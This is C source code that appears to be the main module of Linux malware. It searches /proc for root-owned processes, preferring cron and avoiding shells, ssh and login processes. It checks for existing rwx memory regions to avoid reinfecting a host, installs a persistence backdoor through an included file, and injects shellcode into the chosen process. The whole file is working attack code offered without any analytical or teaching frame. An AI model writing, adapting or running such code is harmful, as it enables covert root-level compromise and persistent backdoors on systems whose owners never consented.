#include <stdio.h>
#include <dirent.h>
#include "shellcode.h"
#include <fcntl.h>
#include "other_persistencies.c"

int flip_int(int x) {
    return x & 0x000000FF << 24 | x & 0x0000FF00 << 8 | x & 0x00FF0000 >> 8 | x & 0xFF000000 >> 24;
}

int get_uid_proc(int pid) {
    char path[256];
    sprintf(path, "/proc/%d/status", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return -1;
    }

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "Uid:") != NULL) {
            int uid;
            sscanf(line, "Uid: %d", &uid);
            fclose(fp);
            return uid;
        }
    }

    fclose(fp);
    return -1;
}

int get_parent_pid(int pid) {
    char path[256];
    sprintf(path, "/proc/%d/status", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return -1;
    }

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "PPid:") != NULL) {
            int ppid;
            sscanf(line, "PPid: %d", &ppid);
            fclose(fp);
            return ppid;
        }
    }

    fclose(fp);
    return -1;
}

int check_status(int pid) {
    char path[256];
    sprintf(path, "/proc/%d/status", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return 0;
    }
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "State:") != NULL) {
            if (strstr(line, "zombie") != NULL || strstr(line, "stopped") != NULL) {
                fclose(fp);
                return 0;
            }
        }
    }
    fclose(fp);
    return 1;
}

int check_rwx_usual(int pid) {   
    char *line = malloc(0x100);
    char *path = malloc(0x28);
    // check if defunct
    if (check_status(pid) == 0) {
        free(line);
        free(path);
        return 0;
    }

    sprintf(path, "/proc/%d/maps", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        free(line);
        free(path);
        return 0;
    }
    while (fgets(line, 0x100, fp)) {
        if (strstr(line, "rwx") != NULL) {
            unsigned long start, end;
            sscanf(line, "%lx-%lx", &start, &end);
            // log_info("Found PID %d %lx rwx memory region at %lx-%lx\nn", pid, end - start, start, end);
            
            fclose(fp);
            free(line);
            free(path);
            return 1;
        }
    }
    fclose(fp);
    free(line);
    free(path);
    return 0;
}

int check_rwx(int pid) {   
    char *line = malloc(0x100);
    char *path = malloc(0x28);
    // check if defunct
    if (check_status(pid) == 0) {
        free(line);
        free(path);
        return 0;
    }

    sprintf(path, "/proc/%d/maps", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        free(line);
        free(path);
        return 0;
    }
    while (fgets(line, 0x100, fp)) {
        if (strstr(line, "rwx") != NULL) {
            unsigned long start, end;
            sscanf(line, "%lx-%lx", &start, &end);
            // log_info("Found PID %d %lx rwx memory region at %lx-%lx\nn", pid, end - start, start, end);
            if (end - start == MMAP_SZ) {
                fclose(fp);
                free(line);
                free(path);
                return 1;
            }
        }
    }
    fclose(fp);
    free(line);
    free(path);
    return 0;
}

int already_injected(int pid) {

    // iterate thorugh all procs and see if a child is already injected
    DIR *dir;
    struct dirent *entry;
    if (!(dir = opendir("/proc"))) {
        return 0;
    }
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (only_digits(name)) {
                if (get_parent_pid(atoi(name)) == pid) {
                    // log_info("Found child process of %d with PID %d\n", pid, atoi(name));
                    if (check_rwx(atoi(name))) {
                        return 1;
                    }
                }
            }
        }
    }
    closedir(dir);
    return 0;
}

int check_availability(int pid) {
    if (pid == 1)
        return 0;
    if (!check_status(pid)) {
        return 0;
    }
    char path[256];
    sprintf(path, "/proc/%d/cmdline", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return 0;
    }
    char cmdline[256];
    fgets(cmdline, sizeof(cmdline), fp);
    if (strlen(cmdline) == 0) {
        fclose(fp);
        return 0;
    }
    if (cmdline[0] != '/') {
        fclose(fp);
        return 0;
    }
    if (strstr(cmdline, "bash") != NULL || strstr(cmdline, "ssh") != NULL || strstr(cmdline, "init") != NULL || strstr(cmdline, "droplet") || strstr(cmdline, "Modem") != NULL || strstr(cmdline, "agetty") != NULL) {
        fclose(fp);
        return 0;
    }
    fclose(fp);
    return 1;
}


int get_cron_pid() {
    DIR *dir;
    struct dirent *entry;
    if (!(dir = opendir("/proc"))) {
        return -1;
    }
    char cmdline[256];
    char *path = malloc(0x28);
    strcpy(path, "/proc/");
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (only_digits(name) && atoi(name) >= 200) {
                strcpy(path + 6, name);
                strcpy(path + 6 + strlen(name), "/cmdline");

                FILE *fp = fopen(path, "r");
                if (fp != NULL) {
                    fgets(cmdline, sizeof(cmdline), fp);
                    fclose(fp);
                    if (strstr(cmdline, "cron") != NULL) {
                        free(path);
                        return atoi(name);
                    }
                }
            }
        }
    }
    free(path);
    closedir(dir);
    return -1;
}

int find_pid() {
    DIR *dir;
    struct dirent *entry;
    if (!(dir = opendir("/proc"))) {
        return -1;
    }
    
    char data[2], proc_name[12];
    int idx = 1;
    memset(proc_name, 0, sizeof(proc_name));

    FILE* fd = fopen(IDX_DIR, "r");
    if (fd == NULL) {
        fd = fopen(IDX_DIR, "w");
        fwrite("\x01", 1, 1, fd);
        idx = 1;
        fclose(fd);
    } else {
        fgets(data, 2, fd);

        FILE *fd_op = fopen(OP_DIR, "r");
        if (fd_op != NULL) {
            char op[2];
            fgets(op, 2, fd_op);
            fclose(fd_op);
            data[0] += op[0];
            data[0] = data[0] % 2;
        }


        fclose(fd);
        fd = fopen(IDX_DIR, "w");
        // ftruncate(fd, 0);
        if (data[0] == '\x00') {
            idx = 1;
            fwrite("\x01", 1, 1, fd);
        } else {
            idx = 2;
            fwrite("\x00", 1, 1, fd);
        }
        fclose(fd);
    }

    char cmdline[256];
    char *path = malloc(0x28);
    strcpy(path, "/proc/");

    int crt = 1;
    // log_info("Searching for process with index %d\n", idx);

    if (idx == 1) {
        int cron_pid = get_cron_pid();
        if (cron_pid != -1 && get_uid_proc(cron_pid) == 0 && check_availability(cron_pid) && !attach(cron_pid) && !already_injected(cron_pid)) {
            printf("cron\n");
            detach(cron_pid);
            // log_info("Found cron process with PID %d and UID %d\n", cron_pid, get_uid_proc(cron_pid));
            return cron_pid;
        }
    }
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (only_digits(name)) {
                strcpy(path + 6, name);
                strcpy(path + 6 + strlen(name), "/cmdline");

                FILE *fp = fopen(path, "r");
                if (fp != NULL) {
                    fgets(cmdline, sizeof(cmdline), fp);
                    fclose(fp);
                    
                   if (atoi(name) >= 200 && get_uid_proc(atoi(name)) == 0 && check_availability(atoi(name)) && !attach(atoi(name)) && !already_injected(atoi(name)) && !check_rwx(atoi(name))) {
                        detach(atoi(name));

                        if (crt == idx) {
                            // log_info("Found process with PID %s and UID %d\n", name, get_uid_proc(atoi(name)));
                            return atoi(name);
                        } else
                            crt++;
                    }
                }
            }

        }
    }

    closedir(dir);
    FILE *fp = fopen(PROC_LOG, "a");
    fprintf(fp, "No process found\n");
    fclose(fp);
    return -1;
}

int already_setup() {
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir("/proc"))) {
        return 0;
    }
    int cnt = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (only_digits(name)) {
                if (check_rwx(atoi(name)) && check_status(atoi(name))) {
                    // log_info("rwx with PID %s\n", name);
                    cnt++;
                }
            }
        }
    }
    closedir(dir);
    return cnt;
}

void install_persist() {
    int uid = getuid();
    cat_backdoor(uid);
}


int main(int argc, char **argv) {
    install_persist();
    int aux = already_setup();
    // log_info("Already setup: %d\n", aux);
    if (aux >= 2) {
        if (DEBUG) {
            FILE *fp = fopen("/tmp/log", "a");
            fprintf(fp, "Already setup\n");
            fclose(fp);
        }
        return 0;
    }
    int pid = find_pid();
    if (pid == -1)
        return 0;
    // log_info("Injecting shellcode into PID %d\n", pid);
    
    if (DEBUG) {
        if (getuid() != 0) {
            FILE *fp1 = fopen("/tmp/log", "a");
            fprintf(fp1, "Not root\n");
            fclose(fp1);
            return 0;
        }
        FILE *fp = fopen("/tmp/log", "a");
        int tim = time(NULL);
        fprintf(fp, "PID %d at %d\n", pid, tim);
        fclose(fp);
    }
    return inject((pid_t)pid, shellcode, shellcode_len);
}